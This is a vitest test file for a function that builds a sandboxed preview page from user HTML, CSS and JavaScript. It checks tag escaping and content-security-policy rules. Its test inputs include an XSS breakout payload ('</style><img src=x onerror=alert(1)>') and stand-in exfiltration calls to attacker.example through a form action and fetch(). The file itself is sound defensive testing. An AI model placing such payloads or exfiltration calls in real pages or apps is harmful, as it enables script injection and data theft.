import { describe, expect, it } from "vitest";

import { composePreviewDocument } from "@/lib/preview";

describe("composePreviewDocument", () => {
  it("composes body HTML, CSS, and JavaScript into a complete document", () => {
    const document = composePreviewDocument({
      html: '<button id="save">Save</button>',
      css: "button { color: tomato; }",
      javascript: "document.querySelector('#save').disabled = true;",
    });

    expect(document).toContain("<!doctype html>");
    expect(document).toContain('<button id="save">Save</button>');
    expect(document).toContain("button { color: tomato; }");
    expect(document).toContain("document.querySelector('#save').disabled = true;");
  });

  it("neutralizes closing style and script tags in generated source", () => {
    const document = composePreviewDocument({
      html: "<main>Safe</main>",
      css: "</style><img src=x onerror=alert(1)>",
      javascript: "</script><img src=x onerror=alert(1)>",
    });

    expect(document).not.toContain("</style><img");
    expect(document).not.toContain("</script><img");
    expect(document).toContain("<\\/style><img");
    expect(document).toContain("<\\/script><img");
  });

  it("blocks generated applications from sending data to external origins", () => {
    const document = composePreviewDocument({
      html: '<form action="https://attacker.example"><input name="secret"></form>',
      css: "",
      javascript: "fetch('https://attacker.example')",
    });

    expect(document).toContain("connect-src 'none'");
    expect(document).toContain("form-action 'none'");
    expect(document).toContain("base-uri 'none'");
    expect(document).toContain("img-src data: blob:");
    expect(document).not.toContain("img-src data: blob: https:");
    expect(document).toContain("font-src data:");
    expect(document).not.toContain("font-src data: https:");
  });
});
